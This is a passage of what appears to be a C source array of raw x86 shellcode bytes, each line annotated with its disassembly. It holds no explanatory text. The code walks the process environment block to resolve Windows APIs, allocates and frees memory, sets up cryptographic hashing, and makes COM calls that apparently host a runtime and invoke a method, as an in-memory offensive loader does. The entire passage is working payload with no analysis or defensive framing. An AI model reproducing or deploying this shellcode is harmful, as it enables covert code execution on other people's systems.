  /* 0483 */ "\x89\x7c\x24\x24"                 /* mov       dword ptr [esp + 0x24], edi         */
  /* 0487 */ "\xff\x93\x6c\x01\x00\x00"         /* call      dword ptr [ebx + 0x16c]             */
  /* 048D */ "\x89\x44\x24\x34"                 /* mov       dword ptr [esp + 0x34], eax         */
  /* 0491 */ "\x8d\x8b\xc8\x02\x00\x00"         /* lea       ecx, dword ptr [ebx + 0x2c8]        */
  /* 0497 */ "\x8d\x44\x24\x30"                 /* lea       eax, dword ptr [esp + 0x30]         */
  /* 049B */ "\x50"                             /* push      eax                                 */
  /* 049C */ "\x51"                             /* push      ecx                                 */
  /* 049D */ "\x8d\x8b\xb8\x02\x00\x00"         /* lea       ecx, dword ptr [ebx + 0x2b8]        */
  /* 04A3 */ "\x51"                             /* push      ecx                                 */
  /* 04A4 */ "\xff\x93\x58\x01\x00\x00"         /* call      dword ptr [ebx + 0x158]             */
  /* 04AA */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 04AC */ "\x0f\x88\xeb\x01\x00\x00"         /* js        0x69d                               */
  /* 04B2 */ "\x8b\x4c\x24\x30"                 /* mov       ecx, dword ptr [esp + 0x30]         */
  /* 04B6 */ "\x8d\x44\x24\x18"                 /* lea       eax, dword ptr [esp + 0x18]         */
  /* 04BA */ "\x50"                             /* push      eax                                 */
  /* 04BB */ "\x8d\x83\xd8\x02\x00\x00"         /* lea       eax, dword ptr [ebx + 0x2d8]        */
  /* 04C1 */ "\x50"                             /* push      eax                                 */
  /* 04C2 */ "\x8b\x11"                         /* mov       edx, dword ptr [ecx]                */
  /* 04C4 */ "\x8d\x86\x00\x01\x00\x00"         /* lea       eax, dword ptr [esi + 0x100]        */
  /* 04CA */ "\x50"                             /* push      eax                                 */
  /* 04CB */ "\x51"                             /* push      ecx                                 */
  /* 04CC */ "\xff\x52\x0c"                     /* call      dword ptr [edx + 0xc]               */
  /* 04CF */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 04D1 */ "\x0f\x88\xbc\x01\x00\x00"         /* js        0x693                               */
  /* 04D7 */ "\x8b\x44\x24\x18"                 /* mov       eax, dword ptr [esp + 0x18]         */
  /* 04DB */ "\x8d\x54\x24\x38"                 /* lea       edx, dword ptr [esp + 0x38]         */
  /* 04DF */ "\x52"                             /* push      edx                                 */
  /* 04E0 */ "\x50"                             /* push      eax                                 */
  /* 04E1 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 04E3 */ "\xff\x51\x28"                     /* call      dword ptr [ecx + 0x28]              */
  /* 04E6 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 04E8 */ "\x0f\x88\x9b\x01\x00\x00"         /* js        0x689                               */
  /* 04EE */ "\x83\x7c\x24\x38\x00"             /* cmp       dword ptr [esp + 0x38], 0           */
  /* 04F3 */ "\x0f\x84\x90\x01\x00\x00"         /* je        0x689                               */
  /* 04F9 */ "\x8b\x4c\x24\x18"                 /* mov       ecx, dword ptr [esp + 0x18]         */
  /* 04FD */ "\x8d\x44\x24\x14"                 /* lea       eax, dword ptr [esp + 0x14]         */
  /* 0501 */ "\x50"                             /* push      eax                                 */
  /* 0502 */ "\x8d\x83\xf8\x02\x00\x00"         /* lea       eax, dword ptr [ebx + 0x2f8]        */
  /* 0508 */ "\x50"                             /* push      eax                                 */
  /* 0509 */ "\x8b\x11"                         /* mov       edx, dword ptr [ecx]                */
  /* 050B */ "\x8d\x83\xe8\x02\x00\x00"         /* lea       eax, dword ptr [ebx + 0x2e8]        */
  /* 0511 */ "\x50"                             /* push      eax                                 */
  /* 0512 */ "\x51"                             /* push      ecx                                 */
  /* 0513 */ "\xff\x52\x24"                     /* call      dword ptr [edx + 0x24]              */
  /* 0516 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0518 */ "\x0f\x88\x6b\x01\x00\x00"         /* js        0x689                               */
  /* 051E */ "\x8b\x44\x24\x14"                 /* mov       eax, dword ptr [esp + 0x14]         */
  /* 0522 */ "\x50"                             /* push      eax                                 */
  /* 0523 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 0525 */ "\xff\x51\x28"                     /* call      dword ptr [ecx + 0x28]              */
  /* 0528 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 052A */ "\x0f\x88\x4f\x01\x00\x00"         /* js        0x67f                               */
  /* 0530 */ "\x8b\x44\x24\x14"                 /* mov       eax, dword ptr [esp + 0x14]         */
  /* 0534 */ "\x8d\x54\x24\x2c"                 /* lea       edx, dword ptr [esp + 0x2c]         */
  /* 0538 */ "\x52"                             /* push      edx                                 */
  /* 0539 */ "\x50"                             /* push      eax                                 */
  /* 053A */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 053C */ "\xff\x51\x34"                     /* call      dword ptr [ecx + 0x34]              */
  /* 053F */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0541 */ "\x0f\x88\x2e\x01\x00\x00"         /* js        0x675                               */
  /* 0547 */ "\x8b\x4c\x24\x2c"                 /* mov       ecx, dword ptr [esp + 0x2c]         */
  /* 054B */ "\x8d\x44\x24\x28"                 /* lea       eax, dword ptr [esp + 0x28]         */
  /* 054F */ "\x50"                             /* push      eax                                 */
  /* 0550 */ "\x8d\x83\x08\x03\x00\x00"         /* lea       eax, dword ptr [ebx + 0x308]        */
  /* 0556 */ "\x50"                             /* push      eax                                 */
  /* 0557 */ "\x8b\x11"                         /* mov       edx, dword ptr [ecx]                */
  /* 0559 */ "\x51"                             /* push      ecx                                 */
  /* 055A */ "\xff\x12"                         /* call      dword ptr [edx]                     */
  /* 055C */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 055E */ "\x0f\x88\x07\x01\x00\x00"         /* js        0x66b                               */
  /* 0564 */ "\x8b\x44\x24\x28"                 /* mov       eax, dword ptr [esp + 0x28]         */
  /* 0568 */ "\x8d\x54\x24\x24"                 /* lea       edx, dword ptr [esp + 0x24]         */
  /* 056C */ "\x52"                             /* push      edx                                 */
  /* 056D */ "\x55"                             /* push      ebp                                 */
  /* 056E */ "\x50"                             /* push      eax                                 */
  /* 056F */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 0571 */ "\xff\x91\xb4\x00\x00\x00"         /* call      dword ptr [ecx + 0xb4]              */
  /* 0577 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0579 */ "\x0f\x88\xe2\x00\x00\x00"         /* js        0x661                               */
  /* 057F */ "\x6a\x10"                         /* push      0x10                                */
  /* 0581 */ "\x59"                             /* pop       ecx                                 */
  /* 0582 */ "\x32\xc0"                         /* xor       al, al                              */
  /* 0584 */ "\x8d\x7c\x24\x58"                 /* lea       edi, dword ptr [esp + 0x58]         */
  /* 0588 */ "\xf3\xaa"                         /* rep stosb byte ptr es:[edi], al               */
  /* 058A */ "\x8b\x44\x24\x24"                 /* mov       eax, dword ptr [esp + 0x24]         */
  /* 058E */ "\x8d\x54\x24\x1c"                 /* lea       edx, dword ptr [esp + 0x1c]         */
  /* 0592 */ "\x8b\x7c\x24\x20"                 /* mov       edi, dword ptr [esp + 0x20]         */
  /* 0596 */ "\x52"                             /* push      edx                                 */
  /* 0597 */ "\x57"                             /* push      edi                                 */
  /* 0598 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 059A */ "\x50"                             /* push      eax                                 */
  /* 059B */ "\xff\x51\x44"                     /* call      dword ptr [ecx + 0x44]              */
  /* 059E */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 05A0 */ "\x0f\x88\xb1\x00\x00\x00"         /* js        0x657                               */
  /* 05A6 */ "\x8b\x86\xc0\x01\x00\x00"         /* mov       eax, dword ptr [esi + 0x1c0]        */
  /* 05AC */ "\x33\xed"                         /* xor       ebp, ebp                            */
  /* 05AE */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 05B0 */ "\x74\x5d"                         /* je        0x60f                               */
  /* 05B2 */ "\x50"                             /* push      eax                                 */
  /* 05B3 */ "\x55"                             /* push      ebp                                 */
  /* 05B4 */ "\x6a\x0c"                         /* push      0xc                                 */
  /* 05B6 */ "\xff\x93\x60\x01\x00\x00"         /* call      dword ptr [ebx + 0x160]             */
  /* 05BC */ "\x8b\xe8"                         /* mov       ebp, eax                            */
  /* 05BE */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 05C0 */ "\x74\x4d"                         /* je        0x60f                               */
  /* 05C2 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 05C4 */ "\x89\x44\x24\x10"                 /* mov       dword ptr [esp + 0x10], eax         */
  /* 05C8 */ "\x39\x86\xc0\x01\x00\x00"         /* cmp       dword ptr [esi + 0x1c0], eax        */
  /* 05CE */ "\x76\x3f"                         /* jbe       0x60f                               */
  /* 05D0 */ "\xc1\xe0\x06"                     /* shl       eax, 6                              */
  /* 05D3 */ "\x05\xc4\x01\x00\x00"             /* add       eax, 0x1c4                          */
  /* 05D8 */ "\x03\xc6"                         /* add       eax, esi                            */
  /* 05DA */ "\x50"                             /* push      eax                                 */
  /* 05DB */ "\xff\x93\x6c\x01\x00\x00"         /* call      dword ptr [ebx + 0x16c]             */
  /* 05E1 */ "\x6a\x08"                         /* push      8                                   */
  /* 05E3 */ "\x89\x44\x24\x54"                 /* mov       dword ptr [esp + 0x54], eax         */
  /* 05E7 */ "\x58"                             /* pop       eax                                 */
  /* 05E8 */ "\x66\x89\x44\x24\x48"             /* mov       word ptr [esp + 0x48], ax           */
  /* 05ED */ "\x8d\x44\x24\x48"                 /* lea       eax, dword ptr [esp + 0x48]         */
  /* 05F1 */ "\x50"                             /* push      eax                                 */
  /* 05F2 */ "\x8d\x44\x24\x14"                 /* lea       eax, dword ptr [esp + 0x14]         */
  /* 05F6 */ "\x50"                             /* push      eax                                 */
  /* 05F7 */ "\x55"                             /* push      ebp                                 */
  /* 05F8 */ "\xff\x93\x64\x01\x00\x00"         /* call      dword ptr [ebx + 0x164]             */
  /* 05FE */ "\x8b\x44\x24\x10"                 /* mov       eax, dword ptr [esp + 0x10]         */
  /* 0602 */ "\x40"                             /* inc       eax                                 */
  /* 0603 */ "\x89\x44\x24\x10"                 /* mov       dword ptr [esp + 0x10], eax         */
  /* 0607 */ "\x3b\x86\xc0\x01\x00\x00"         /* cmp       eax, dword ptr [esi + 0x1c0]        */
  /* 060D */ "\x72\xc1"                         /* jb        0x5d0                               */
  /* 060F */ "\x8b\x44\x24\x1c"                 /* mov       eax, dword ptr [esp + 0x1c]         */
  /* 0613 */ "\x8d\x54\x24\x68"                 /* lea       edx, dword ptr [esp + 0x68]         */
  /* 0617 */ "\x52"                             /* push      edx                                 */
  /* 0618 */ "\x55"                             /* push      ebp                                 */
  /* 0619 */ "\x83\xec\x10"                     /* sub       esp, 0x10                           */
  /* 061C */ "\x8d\x74\x24\x70"                 /* lea       esi, dword ptr [esp + 0x70]         */
  /* 0620 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 0622 */ "\x8b\xfc"                         /* mov       edi, esp                            */
  /* 0624 */ "\x6a\x00"                         /* push      0                                   */
  /* 0626 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0627 */ "\x68\x18\x01\x00\x00"             /* push      0x118                               */
  /* 062C */ "\xff\x74\x24\x54"                 /* push      dword ptr [esp + 0x54]              */
  /* 0630 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0631 */ "\x50"                             /* push      eax                                 */
  /* 0632 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0633 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0634 */ "\xff\x91\xe4\x00\x00\x00"         /* call      dword ptr [ecx + 0xe4]              */
  /* 063A */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 063C */ "\x74\x07"                         /* je        0x645                               */
  /* 063E */ "\x55"                             /* push      ebp                                 */
  /* 063F */ "\xff\x93\x68\x01\x00\x00"         /* call      dword ptr [ebx + 0x168]             */
  /* 0645 */ "\x8b\x44\x24\x1c"                 /* mov       eax, dword ptr [esp + 0x1c]         */
  /* 0649 */ "\x50"                             /* push      eax                                 */
  /* 064A */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 064C */ "\xff\x51\x08"                     /* call      dword ptr [ecx + 8]                 */
  /* 064F */ "\x8b\x6c\x24\x3c"                 /* mov       ebp, dword ptr [esp + 0x3c]         */
  /* 0653 */ "\x8b\x7c\x24\x20"                 /* mov       edi, dword ptr [esp + 0x20]         */
  /* 0657 */ "\x8b\x44\x24\x24"                 /* mov       eax, dword ptr [esp + 0x24]         */
  /* 065B */ "\x50"                             /* push      eax                                 */
  /* 065C */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 065E */ "\xff\x51\x08"                     /* call      dword ptr [ecx + 8]                 */
  /* 0661 */ "\x8b\x44\x24\x28"                 /* mov       eax, dword ptr [esp + 0x28]         */
  /* 0665 */ "\x50"                             /* push      eax                                 */
  /* 0666 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 0668 */ "\xff\x51\x08"                     /* call      dword ptr [ecx + 8]                 */
  /* 066B */ "\x8b\x44\x24\x2c"                 /* mov       eax, dword ptr [esp + 0x2c]         */
  /* 066F */ "\x50"                             /* push      eax                                 */
  /* 0670 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 0672 */ "\xff\x51\x08"                     /* call      dword ptr [ecx + 8]                 */
  /* 0675 */ "\x8b\x44\x24\x14"                 /* mov       eax, dword ptr [esp + 0x14]         */
  /* 0679 */ "\x50"                             /* push      eax                                 */
  /* 067A */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 067C */ "\xff\x51\x2c"                     /* call      dword ptr [ecx + 0x2c]              */
  /* 067F */ "\x8b\x44\x24\x14"                 /* mov       eax, dword ptr [esp + 0x14]         */
  /* 0683 */ "\x50"                             /* push      eax                                 */
  /* 0684 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 0686 */ "\xff\x51\x08"                     /* call      dword ptr [ecx + 8]                 */
  /* 0689 */ "\x8b\x44\x24\x18"                 /* mov       eax, dword ptr [esp + 0x18]         */
  /* 068D */ "\x50"                             /* push      eax                                 */
  /* 068E */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 0690 */ "\xff\x51\x08"                     /* call      dword ptr [ecx + 8]                 */
  /* 0693 */ "\x8b\x44\x24\x30"                 /* mov       eax, dword ptr [esp + 0x30]         */
  /* 0697 */ "\x50"                             /* push      eax                                 */
  /* 0698 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 069A */ "\xff\x51\x08"                     /* call      dword ptr [ecx + 8]                 */
  /* 069D */ "\x55"                             /* push      ebp                                 */
  /* 069E */ "\xff\x93\x68\x01\x00\x00"         /* call      dword ptr [ebx + 0x168]             */
  /* 06A4 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 06A6 */ "\x74\x07"                         /* je        0x6af                               */
  /* 06A8 */ "\x57"                             /* push      edi                                 */
  /* 06A9 */ "\xff\x93\x70\x01\x00\x00"         /* call      dword ptr [ebx + 0x170]             */
  /* 06AF */ "\x8b\x44\x24\x34"                 /* mov       eax, dword ptr [esp + 0x34]         */
  /* 06B3 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 06B5 */ "\x74\x07"                         /* je        0x6be                               */
  /* 06B7 */ "\x50"                             /* push      eax                                 */
  /* 06B8 */ "\xff\x93\x70\x01\x00\x00"         /* call      dword ptr [ebx + 0x170]             */
  /* 06BE */ "\x5f"                             /* pop       edi                                 */
  /* 06BF */ "\x5e"                             /* pop       esi                                 */
  /* 06C0 */ "\x5d"                             /* pop       ebp                                 */
  /* 06C1 */ "\x5b"                             /* pop       ebx                                 */
  /* 06C2 */ "\x83\xc4\x68"                     /* add       esp, 0x68                           */
  /* 06C5 */ "\xc3"                             /* ret                                           */
  /* 06C6 */ "\x83\xec\x18"                     /* sub       esp, 0x18                           */
  /* 06C9 */ "\x53"                             /* push      ebx                                 */
  /* 06CA */ "\x55"                             /* push      ebp                                 */
  /* 06CB */ "\x56"                             /* push      esi                                 */
  /* 06CC */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 06CE */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 06D0 */ "\x57"                             /* push      edi                                 */
  /* 06D1 */ "\x89\x5c\x24\x14"                 /* mov       dword ptr [esp + 0x14], ebx         */
  /* 06D5 */ "\x8b\xeb"                         /* mov       ebp, ebx                            */
  /* 06D7 */ "\x89\x5c\x24\x10"                 /* mov       dword ptr [esp + 0x10], ebx         */
  /* 06DB */ "\x83\xbe\x18\x03\x00\x00\x01"     /* cmp       dword ptr [esi + 0x318], 1          */
  /* 06E2 */ "\x8d\xbe\xd0\x05\x00\x00"         /* lea       edi, dword ptr [esi + 0x5d0]        */
  /* 06E8 */ "\x74\x02"                         /* je        0x6ec                               */
  /* 06EA */ "\x8b\x3f"                         /* mov       edi, dword ptr [edi]                */
  /* 06EC */ "\x68\x40\x00\x00\xf0"             /* push      0xf0000040                          */
  /* 06F1 */ "\x6a\x18"                         /* push      0x18                                */
  /* 06F3 */ "\x53"                             /* push      ebx                                 */
  /* 06F4 */ "\x53"                             /* push      ebx                                 */
  /* 06F5 */ "\x8d\x44\x24\x24"                 /* lea       eax, dword ptr [esp + 0x24]         */
  /* 06F9 */ "\x50"                             /* push      eax                                 */
  /* 06FA */ "\xff\x96\x98\x01\x00\x00"         /* call      dword ptr [esi + 0x198]             */
  /* 0700 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0702 */ "\x0f\x84\x2e\x01\x00\x00"         /* je        0x836                               */
  /* 0708 */ "\x53"                             /* push      ebx                                 */
  /* 0709 */ "\x53"                             /* push      ebx                                 */
  /* 070A */ "\x8d\x4c\x24\x18"                 /* lea       ecx, dword ptr [esp + 0x18]         */
  /* 070E */ "\x51"                             /* push      ecx                                 */
  /* 070F */ "\x53"                             /* push      ebx                                 */
  /* 0710 */ "\x6a\x07"                         /* push      7                                   */
  /* 0712 */ "\x8d\x86\xac\x03\x00\x00"         /* lea       eax, dword ptr [esi + 0x3ac]        */
  /* 0718 */ "\x53"                             /* push      ebx                                 */
  /* 0719 */ "\x50"                             /* push      eax                                 */
  /* 071A */ "\xff\x96\xb4\x01\x00\x00"         /* call      dword ptr [esi + 0x1b4]             */
  /* 0720 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0722 */ "\x0f\x84\x01\x01\x00\x00"         /* je        0x829                               */
  /* 0728 */ "\x6a\x04"                         /* push      4                                   */
  /* 072A */ "\x68\x00\x30\x00\x00"             /* push      0x3000                              */
  /* 072F */ "\xff\x74\x24\x18"                 /* push      dword ptr [esp + 0x18]              */
  /* 0733 */ "\x53"                             /* push      ebx                                 */
  /* 0734 */ "\xff\x96\x3c\x01\x00\x00"         /* call      dword ptr [esi + 0x13c]             */
  /* 073A */ "\x8b\xd8"                         /* mov       ebx, eax                            */
  /* 073C */ "\x85\xdb"                         /* test      ebx, ebx                            */
  /* 073E */ "\x0f\x84\xe3\x00\x00\x00"         /* je        0x827                               */
  /* 0744 */ "\x33\xc9"                         /* xor       ecx, ecx                            */
  /* 0746 */ "\x8d\x44\x24\x10"                 /* lea       eax, dword ptr [esp + 0x10]         */
  /* 074A */ "\x51"                             /* push      ecx                                 */
  /* 074B */ "\x51"                             /* push      ecx                                 */
  /* 074C */ "\x50"                             /* push      eax                                 */
  /* 074D */ "\x53"                             /* push      ebx                                 */
  /* 074E */ "\x6a\x07"                         /* push      7                                   */
  /* 0750 */ "\x51"                             /* push      ecx                                 */
  /* 0751 */ "\x8d\x86\xac\x03\x00\x00"         /* lea       eax, dword ptr [esi + 0x3ac]        */
  /* 0757 */ "\x50"                             /* push      eax                                 */
  /* 0758 */ "\xff\x96\xb4\x01\x00\x00"         /* call      dword ptr [esi + 0x1b4]             */
  /* 075E */ "\x8d\x44\x24\x24"                 /* lea       eax, dword ptr [esp + 0x24]         */
  /* 0762 */ "\x50"                             /* push      eax                                 */
  /* 0763 */ "\x8d\x44\x24\x24"                 /* lea       eax, dword ptr [esp + 0x24]         */
  /* 0767 */ "\x50"                             /* push      eax                                 */
  /* 0768 */ "\x6a\x00"                         /* push      0                                   */
  /* 076A */ "\x68\x00\x80\x00\x00"             /* push      0x8000                              */
  /* 076F */ "\xff\x74\x24\x20"                 /* push      dword ptr [esp + 0x20]              */
  /* 0773 */ "\x53"                             /* push      ebx                                 */
  /* 0774 */ "\x6a\x08"                         /* push      8                                   */
  /* 0776 */ "\x68\x01\x00\x01\x00"             /* push      0x10001                             */
  /* 077B */ "\xff\x96\xb8\x01\x00\x00"         /* call      dword ptr [esi + 0x1b8]             */
  /* 0781 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0783 */ "\x0f\x84\x90\x00\x00\x00"         /* je        0x819                               */
  /* 0789 */ "\x8d\x44\x24\x1c"                 /* lea       eax, dword ptr [esp + 0x1c]         */
  /* 078D */ "\x50"                             /* push      eax                                 */
  /* 078E */ "\xff\x74\x24\x24"                 /* push      dword ptr [esp + 0x24]              */
  /* 0792 */ "\x6a\x01"                         /* push      1                                   */
  /* 0794 */ "\xff\x74\x24\x20"                 /* push      dword ptr [esp + 0x20]              */
  /* 0798 */ "\xff\x96\xbc\x01\x00\x00"         /* call      dword ptr [esi + 0x1bc]             */
  /* 079E */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 07A0 */ "\x74\x6d"                         /* je        0x80f                               */
  /* 07A2 */ "\x8d\x44\x24\x18"                 /* lea       eax, dword ptr [esp + 0x18]         */
  /* 07A6 */ "\x50"                             /* push      eax                                 */
  /* 07A7 */ "\x6a\x00"                         /* push      0                                   */
  /* 07A9 */ "\x6a\x00"                         /* push      0                                   */
  /* 07AB */ "\x68\x0c\x80\x00\x00"             /* push      0x800c                              */
  /* 07B0 */ "\xff\x74\x24\x24"                 /* push      dword ptr [esp + 0x24]              */
  /* 07B4 */ "\xff\x96\x9c\x01\x00\x00"         /* call      dword ptr [esi + 0x19c]             */
  /* 07BA */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 07BC */ "\x74\x47"                         /* je        0x805                               */
  /* 07BE */ "\x8b\x86\xcc\x05\x00\x00"         /* mov       eax, dword ptr [esi + 0x5cc]        */
  /* 07C4 */ "\x6a\x00"                         /* push      0                                   */
  /* 07C6 */ "\x2d\x00\x01\x00\x00"             /* sub       eax, 0x100                          */
  /* 07CB */ "\x50"                             /* push      eax                                 */
  /* 07CC */ "\x8d\x87\x00\x01\x00\x00"         /* lea       eax, dword ptr [edi + 0x100]        */
  /* 07D2 */ "\x50"                             /* push      eax                                 */
  /* 07D3 */ "\xff\x74\x24\x24"                 /* push      dword ptr [esp + 0x24]              */
  /* 07D7 */ "\xff\x96\xa0\x01\x00\x00"         /* call      dword ptr [esi + 0x1a0]             */
  /* 07DD */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 07DF */ "\x74\x1a"                         /* je        0x7fb                               */
  /* 07E1 */ "\x6a\x00"                         /* push      0                                   */
  /* 07E3 */ "\x6a\x00"                         /* push      0                                   */
  /* 07E5 */ "\xff\x74\x24\x24"                 /* push      dword ptr [esp + 0x24]              */
  /* 07E9 */ "\x68\x00\x01\x00\x00"             /* push      0x100                               */
  /* 07EE */ "\x57"                             /* push      edi                                 */
  /* 07EF */ "\xff\x74\x24\x2c"                 /* push      dword ptr [esp + 0x2c]              */
  /* 07F3 */ "\xff\x96\xa4\x01\x00\x00"         /* call      dword ptr [esi + 0x1a4]             */
  /* 07F9 */ "\x8b\xe8"                         /* mov       ebp, eax                            */
  /* 07FB */ "\xff\x74\x24\x18"                 /* push      dword ptr [esp + 0x18]              */
  /* 07FF */ "\xff\x96\xa8\x01\x00\x00"         /* call      dword ptr [esi + 0x1a8]             */
  /* 0805 */ "\xff\x74\x24\x1c"                 /* push      dword ptr [esp + 0x1c]              */
  /* 0809 */ "\xff\x96\xac\x01\x00\x00"         /* call      dword ptr [esi + 0x1ac]             */
  /* 080F */ "\xff\x74\x24\x20"                 /* push      dword ptr [esp + 0x20]              */
  /* 0813 */ "\xff\x96\x44\x01\x00\x00"         /* call      dword ptr [esi + 0x144]             */
  /* 0819 */ "\x68\x00\xc0\x00\x00"             /* push      0xc000                              */
  /* 081E */ "\x6a\x00"                         /* push      0                                   */
  /* 0820 */ "\x53"                             /* push      ebx                                 */
  /* 0821 */ "\xff\x96\x40\x01\x00\x00"         /* call      dword ptr [esi + 0x140]             */
  /* 0827 */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 0829 */ "\x53"                             /* push      ebx                                 */
  /* 082A */ "\xff\x74\x24\x18"                 /* push      dword ptr [esp + 0x18]              */
  /* 082E */ "\xff\x96\xb0\x01\x00\x00"         /* call      dword ptr [esi + 0x1b0]             */
  /* 0834 */ "\x8b\xc5"                         /* mov       eax, ebp                            */
  /* 0836 */ "\x5f"                             /* pop       edi                                 */
  /* 0837 */ "\x5e"                             /* pop       esi                                 */
  /* 0838 */ "\x5d"                             /* pop       ebp                                 */
  /* 0839 */ "\x5b"                             /* pop       ebx                                 */
  /* 083A */ "\x83\xc4\x18"                     /* add       esp, 0x18                           */
  /* 083D */ "\xc3"                             /* ret                                           */
  /* 083E */ "\x64\xa1\x30\x00\x00\x00"         /* mov       eax, dword ptr fs:[0x30]            */
  /* 0844 */ "\x33\xd2"                         /* xor       edx, edx                            */
  /* 0846 */ "\x56"                             /* push      esi                                 */
  /* 0847 */ "\x8b\x40\x0c"                     /* mov       eax, dword ptr [eax + 0xc]          */
  /* 084A */ "\x8b\x70\x0c"                     /* mov       esi, dword ptr [eax + 0xc]          */
  /* 084D */ "\xeb\x1f"                         /* jmp       0x86e                               */
  /* 084F */ "\x85\xd2"                         /* test      edx, edx                            */
  /* 0851 */ "\x75\x22"                         /* jne       0x875                               */
  /* 0853 */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 0857 */ "\x8b\xc8"                         /* mov       ecx, eax                            */
  /* 0859 */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 085D */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 0861 */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 0865 */ "\xe8\x62\xf8\xff\xff"             /* call      0xcc                                */
  /* 086A */ "\x8b\x36"                         /* mov       esi, dword ptr [esi]                */
  /* 086C */ "\x8b\xd0"                         /* mov       edx, eax                            */
  /* 086E */ "\x8b\x46\x18"                     /* mov       eax, dword ptr [esi + 0x18]         */
  /* 0871 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0873 */ "\x75\xda"                         /* jne       0x84f                               */
  /* 0875 */ "\x8b\xc2"                         /* mov       eax, edx                            */
  /* 0877 */ "\x5e"                             /* pop       esi                                 */
  /* 0878 */ "\xc2\x10\x00"                     /* ret       0x10                                */
  /* 087B */ "\x83\xec\x18"                     /* sub       esp, 0x18                           */
  /* 087E */ "\x53"                             /* push      ebx                                 */
  /* 087F */ "\x8b\x5c\x24\x20"                 /* mov       ebx, dword ptr [esp + 0x20]         */
  /* 0883 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 0885 */ "\x55"                             /* push      ebp                                 */
  /* 0886 */ "\x8b\x6c\x24\x28"                 /* mov       ebp, dword ptr [esp + 0x28]         */
  /* 088A */ "\x56"                             /* push      esi                                 */
  /* 088B */ "\x57"                             /* push      edi                                 */
  /* 088C */ "\x33\xff"                         /* xor       edi, edi                            */
  /* 088E */ "\x89\x4c\x24\x14"                 /* mov       dword ptr [esp + 0x14], ecx         */
  /* 0892 */ "\x33\xf6"                         /* xor       esi, esi                            */
  /* 0894 */ "\x89\x44\x24\x2c"                 /* mov       dword ptr [esp + 0x2c], eax         */
  /* 0898 */ "\x89\x74\x24\x10"                 /* mov       dword ptr [esp + 0x10], esi         */
  /* 089C */ "\x8a\x0c\x08"                     /* mov       cl, byte ptr [eax + ecx]            */
  /* 089F */ "\x84\xc9"                         /* test      cl, cl                              */
  /* 08A1 */ "\x74\x11"                         /* je        0x8b4                               */
  /* 08A3 */ "\x83\xf8\x40"                     /* cmp       eax, 0x40                           */
  /* 08A6 */ "\x74\x0c"                         /* je        0x8b4                               */
  /* 08A8 */ "\x88\x4c\x3c\x18"                 /* mov       byte ptr [esp + edi + 0x18], cl     */
  /* 08AC */ "\x47"                             /* inc       edi                                 */
  /* 08AD */ "\x40"                             /* inc       eax                                 */
  /* 08AE */ "\x89\x44\x24\x2c"                 /* mov       dword ptr [esp + 0x2c], eax         */
  /* 08B2 */ "\xeb\x50"                         /* jmp       0x904                               */
  /* 08B4 */ "\x6a\x10"                         /* push      0x10                                */
  /* 08B6 */ "\x58"                             /* pop       eax                                 */
  /* 08B7 */ "\x8d\x74\x24\x18"                 /* lea       esi, dword ptr [esp + 0x18]         */
  /* 08BB */ "\x2b\xc7"                         /* sub       eax, edi                            */
  /* 08BD */ "\x03\xf7"                         /* add       esi, edi                            */
  /* 08BF */ "\x33\xd2"                         /* xor       edx, edx                            */
  /* 08C1 */ "\x50"                             /* push      eax                                 */
  /* 08C2 */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 08C4 */ "\xe8\xd2\x00\x00\x00"             /* call      0x99b                               */
  /* 08C9 */ "\xc6\x06\x80"                     /* mov       byte ptr [esi], 0x80                */
  /* 08CC */ "\x83\xff\x0c"                     /* cmp       edi, 0xc                            */
  /* 08CF */ "\x72\x1c"                         /* jb        0x8ed                               */
